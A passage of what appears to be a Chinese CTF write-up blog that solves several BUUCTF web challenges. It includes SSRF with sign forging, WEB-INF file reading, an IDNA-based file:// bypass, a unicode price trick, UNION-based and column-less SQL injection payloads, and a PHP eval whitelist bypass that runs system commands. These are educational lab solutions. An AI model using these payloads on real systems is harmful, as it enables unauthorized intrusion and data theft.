class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589354082674.png" alt="1589354082674"></p>
<p>代码审计：</p>
<p>这是一个python的flask框架，有三个路由</p>
<blockquote>
<p>@app.route(“/geneSign”, methods=[‘GET’, ‘POST’])    #调用getSign方法生成 md5</p>
<p>@app.route(‘/De1ta’,methods=[‘GET’,’POST’])    #获取了三个参数，最后传入Task类中</p>
<p>@app.route(‘/‘)        #获取源码</p>
</blockquote>
<p><a href="http://www.bjhee.com/flask-2.html" target="_blank" rel="noopener">Flask框架-路由</a></p>
<p>这里De1ta是关键的页面</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br></pre></td></tr></table></figure>

<p>在/De1ta页面我们get方法传入param参数值，在cookie里面传递action和sign的值，将传递的param通过waf这个函数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>waf函数检查是否以gopher或者file开头，将这两个协议过滤掉，使我们不能通过协议读取文件<br>当绕过waf后，会将传入的参数作为Task类的对象，并执行Exec，跟进这个方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">    <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">            tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">            resp = scan(self.param)</span><br><span class="line">            <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                result[<span class="string">'data'</span>] = resp</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> resp</span><br><span class="line">                tmpfile.write(resp)</span><br><span class="line">                tmpfile.close()</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">            f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">        <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">            result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

<p>其先经过checksign方法检测是否登陆</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>当我们传入的参数action和param经过getSign这个函数之后与sign相等，就返回true。之后进入if语句，判断<code>scan</code>是否在<code>action</code>里面，如果在，则将param经过scan函数处理，之后再进一步判断<br>跟进scan函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br></pre></td></tr></table></figure>

<p>这里可以读取param的内容，并且没有任何过滤，如果将param令为flag.txt，则会得到flag。</p>
<p>首先让<code>self.checkSign()</code>返回true即<code>getSign(self.action, self.param) == self.sign</code>条件成立，先看看getsign</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure>

<p>这里使用了<code>==</code>弱类型比较， 即<code>secert_key + param + action</code>的md5值与传入的sign值相等即可返回true，其中param要为flag.txt，为了保证Exec()函数中scan部分和read部分都能被执行action中又必须包含readscan或者scanread<br><img src="/2020/05/16/BUU-web5/1589357192899.png" alt="1589357192899"></p>
<p>现在的条件为<code>md5(secert_key+flag.txt+readscan/scanread)==sign</code><br>这里我们不知道<code>secert_key</code>,但是/geneSign路由，暴露了getSign函数，我们可以根据路由getSign去得到正确的sign值，这里将action写死为scan，即sign=md5(key + param1 + ‘scan’)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589357431885.png" alt="1589357431885"></p>
<blockquote>
<p>cd792970b68162615b4bb7d77225b507</p>
</blockquote>
<p>这样一来，等号左边为md5(key + ‘flag.txt’ + ‘readscan’)，已被写死，等号右边的未定的参数也可也可确定，即md5(key + ‘flag.txtread’ + ‘scan’)。param1为’flag.txtread’依此传参，可得一个哈希值，这就是我们将传给self.sign的值。</p>
<p><img src="/2020/05/16/BUU-web5/1589358183429.png" alt="1589358183429"></p>
<blockquote>
<p>d7fc4bfd85f94f17fb8b988550209c42</p>
</blockquote>
<p>接着依次传参即可<br><img src="/2020/05/16/BUU-web5/1589358383231.png" alt="1589358383231"></p>
<p>参考文章：<a href="https://www.jianshu.com/p/eb60c856f2a3" target="_blank" rel="noopener">https://www.jianshu.com/p/eb60c856f2a3</a></p>
<h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>这个题留了很久都没做，因为看见java心生恐惧，但是无论遇到什么困难，都不要放弃，微笑着面对它们，消除恐惧的办法就是面对恐惧，加油，奥利给！</p>
<p>打开靶机是一个登陆框，密码可以爆破admin/admin888,但是里面什么都没有<br><img src="/2020/05/16/BUU-web5/1589361523563.png" alt="1589361523563"></p>
<p>退出去，有一个help按钮，点击得到<br><img src="/2020/05/16/BUU-web5/1589361571235.png" alt="1589361571235"></p>
<p>尝试文件包含，看wp里面说将GET请求改为POST<br><a href="https://blog.csdn.net/wy_97/article/details/78165051" target="_blank" rel="noopener">分享一个关于源码泄露的网址</a><br>里面有讲WEB-INF/web.xml泄露。访问一下</p>
<p><img src="/2020/05/16/BUU-web5/1589361940703.png" alt="1589361940703"></p>
<p>接着读取flag，直接照搬了<br>这里是从web.xml里面推测出来classes下面的文件，从而进行读取对应的.class文件</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">filename=<span class="regexp">/WEB-INF/classes</span><span class="regexp">/com/wm</span><span class="regexp">/ctf/</span>FlagController.<span class="keyword">class</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589362044015.png" alt="1589362044015"></p>
<p>将base64解码后得到flag</p>
<p><img src="/2020/05/16/BUU-web5/1589362074667.png" alt="1589362074667"></p>
<h1 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h1><p>源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">        @app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 333"</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>nginx配置<br>配置文件存放目录：/etc/nginx<br>主配置文件：/etc/nginx/conf/nginx.conf<br>管理脚本：/usr/lib64/systemd/system/nginx.service<br>模块：/usr/lisb64/nginx/modules<br>应用程序：/usr/sbin/nginx<br>程序默认存放位置：/usr/share/nginx/html<br>日志默认存放位置：/var/log/nginx<br>配置文件目录为：/usr/local/nginx/conf/nginx.conf</p>
</blockquote>
<p>首先不能让他为 suctf.cc，但是经过了 urlunsplit 后变成 suctf.cc，很容易就构造出：file:////suctf.cc/usr/local/nginx/conf/nginx.conf，这样就能读取nginx的配置文件了<br>读出配置文件中有usr/fffffflag<br>payload：<code>file:////suctf.cc/usr/fffffflag</code></p>
<p><img src="/2020/05/16/BUU-web5/1589417297060.png" alt="1589417297060"></p>
<h1 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h1><p>打开靶机是一个商店，需要我们购买Unicorn，但是价钱的地方只能输入一个字符</p>
<p><img src="/2020/05/16/BUU-web5/1589417919436.png" alt="1589417919436"></p>
<p>查看源码，在<a href="http://d.hatena.ne.jp/keyword/utf-8" target="_blank" rel="noopener">utf-8</a>旁边有一句提示：</p>
<blockquote>
<p>Ah,really important,seriously.</p>
</blockquote>
<p>发现就是<a href="http://d.hatena.ne.jp/keyword/utf-8" target="_blank" rel="noopener">utf-8</a>的编码转换问题。</p>
<p>在<a href="https://www.compart.com/en/unicode/" target="_blank" rel="noopener">这个网站</a>查询<strong>thousand</strong><br>得到许多字符，随便挑，只要比1337大就可以</p>
<p>我选择了<a href="https://www.compart.com/en/unicode/U+1085F" target="_blank" rel="noopener">这个符号</a>，把0x换成%就可以了<br><img src="/2020/05/16/BUU-web5/1589418249241.png" alt="1589418249241"></p>
<h1 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h1><p>打开靶机是一个登陆框，注册后登陆是一个发布广告的地方，随便输入一些字符，发布后点击查看广告详情发现报错，为二次注入<br><img src="/2020/05/16/BUU-web5/1589420089124.png" alt="1589420089124"></p>
<p>存在sql注入<br>过滤了order、by和空格<br>使用<code>union select</code>查看列数</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>'<span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">21</span>,<span class="number">22</span>'</span><br></pre></td></tr></table></figure>

<p>有22列<br><img src="/2020/05/16/BUU-web5/1589423476236.png" alt="1589423476236"></p>
<p>查看数据库</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>'<span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,database(),user(),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">21</span>,<span class="number">22</span>'</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589423527287.png" alt="1589423527287"></p>
<p>该数据库是马里奥数据库：<a href="https://mariadb.com/kb/en/library/mysqlinnodb_table_stats/" target="_blank" rel="noopener">https://mariadb.com/kb/en/library/mysqlinnodb_table_stats/</a><br>滤了information_schema,可以使用<code>**sys.schema_auto_increment_columns**</code>或者<code>mysql.innodb_table_stats</code>代替<br>其查表名的语句为</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>'union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,(select<span class="comment">/**/</span>group_concat(table_name)<span class="comment">/**/</span>from<span class="comment">/**/</span>mysql.innodb_table_stats),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>'</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>'union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,(select<span class="comment">/**/</span>group_concat(table_name)<span class="comment">/**/</span>from<span class="comment">/**/</span>sys.schema_auto_increment_columns<span class="comment">/**/</span>where<span class="comment">/**/</span>table_schema=schema()),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,'<span class="number">22</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589423780836.png" alt="1589423780836"></p>
<p>但是不知道列名，使用无列名注入</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">第二个字段</span><br><span class="line"><span class="number">-1</span>'union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,(select<span class="comment">/**/</span>group_concat(a)<span class="comment">/**/</span>from(select<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span><span class="comment">/**/</span>as<span class="comment">/**/</span>a,<span class="number">3</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select*from<span class="comment">/**/</span>users)x),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,'<span class="number">22</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589429462137.png" alt="1589429462137"></p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">第三个字段</span><br><span class="line"><span class="number">-1</span>'union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,(select<span class="comment">/**/</span>group_concat(b)<span class="comment">/**/</span>from(select<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span>as<span class="comment">/**/</span>b<span class="comment">/**/</span>union<span class="comment">/**/</span>select*from<span class="comment">/**/</span>users)x),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,'<span class="number">22</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589429509486.png" alt="1589429509486"></p>
<h2 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h2><p>先创建一个数据库和一个表，并插入一些数据</p>
<blockquote>
<p>create database testdb;</p>
<p>user testdb;</p>
<p>create table user(id int(10),user varchar(20),password varchar(30));</p>
<p>insert into user values(1,’admin’,’123456’),(2,’admin2’,’111111’);</p>
</blockquote>
<p><img src="/2020/05/16/BUU-web5/1589437665830.png" alt="1589437665830"></p>
<p>正常查询为</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span>;</span><br></pre></td></tr></table></figure>

<p>使用联合查询</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589437970774.png" alt="1589437970774"></p>
<p>其中将列名被替换成了对应的数字，所以如果要查询password列的内容，直接用3代替即可</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">`3`</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span>)a;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589438257604.png" alt="1589438257604"></p>
<blockquote>
<p>末尾的 a 可以是任意字符，用于命名。</p>
</blockquote>
<p>当然，多数情况下，<code>会被过滤。当</code> 不能使用的时候，使用别名来代替：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> b <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">as</span> b <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span>)a;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589438303461.png" alt="1589438303461"></p>
<p>同时查询多个列：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">concat</span>(<span class="string">`2`</span>,<span class="number">0x2d</span>,<span class="string">`3`</span>) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span>)a <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">3</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589438533575.png" alt="1589438533575"></p>
<p>payload：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> a,b <span class="keyword">from</span> posts <span class="keyword">where</span> a=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">concat</span>(<span class="string">`3`</span>,<span class="number">0x2d</span>,<span class="string">`4`</span>) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> xxx)a <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<h1 id="CISCN-2019-Love-Math"><a href="#CISCN-2019-Love-Math" class="headerlink" title="[CISCN 2019 ]Love Math"></a>[CISCN 2019 ]Love Math</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"太长了不会算"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的字符"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的函数"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>PHP函数：</strong></p>
<p>scandir() 函数：返回指定目录中的文件和目录的数组。<br>base_convert() 函数：在任意进制之间转换数字。<br>dechex() 函数：把十进制转换为十六进制。<br>hex2bin() 函数：把十六进制值的字符串转换为 ASCII 字符。<br>var_dump() ：函数用于输出变量的相关信息。<br>readfile() 函数：输出一个文件。该函数读入一个文件并写入到输出缓冲。若成功，则返                        回从文件中读入的字节数。若失败，则返回 false。您可以通过 @readfile() 形式调用该            函数，来隐藏错误信息。<br>语法：readfile(filename,include_path,context)</p>
</blockquote>
<p>首先是通过c进行get传参，不能包含blacklist里面的字符，并且不能有whitelist以外的字符<br>这里可以通过将函数名转为10进制，再通过白名单内的函数转回函数名，执行相应代码<br>payload:</p>
<blockquote>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>) =&gt; <span class="string">"hex2bin"</span></span><br><span class="line">dechex(<span class="number">1598506324</span>) =&gt; <span class="string">"5f474554"</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$pi</span>=hex2bin("5f474554") =&gt; $pi="_GET"   //hex2bin将一串16进制数转换为二进制字符串</span></span><br><span class="line">(<span class="symbol">$</span><span class="symbol">$</span><span class="built-in">pi</span>)&#123;<span class="built-in">pi</span>&#125;((<span class="symbol">$</span><span class="symbol">$</span><span class="built-in">pi</span>)&#123;<span class="built-in">abs</span>&#125;) =&gt; (<span class="symbol">$</span>_GET)&#123;<span class="built-in">pi</span>&#125;(<span class="symbol">$</span>_GET)&#123;<span class="built-in">abs</span>&#125;  <span class="comment">//&#123;&#125;可以代替[]</span></span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">$<span class="literal">pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));($$<span class="literal">pi</span>)&#123;<span class="literal">pi</span>&#125;(($$<span class="literal">pi</span>)&#123;<span class="built_in">abs</span>&#125;)&amp;<span class="literal">pi</span>=system&amp;<span class="built_in">abs</span>=tac /<span class="built_in">flag</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/05/16/BUU-web5/1589442650477.png" alt="1589442650477"></p>
<h1 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h1><p>hint页面查看源码<br><img src="/2020/05/16/BUU-web5/1589444923161.png" alt="1589444923161"></p>
<p>看见ip想到修改xff头</p>
<p>这里为一个模板注入</p>
<p><img src="/2020/05/16/BUU-web5/1589445294546.png" alt="1589445294546"></p>
<p>smarty模板注入payload</p>
<blockquote>
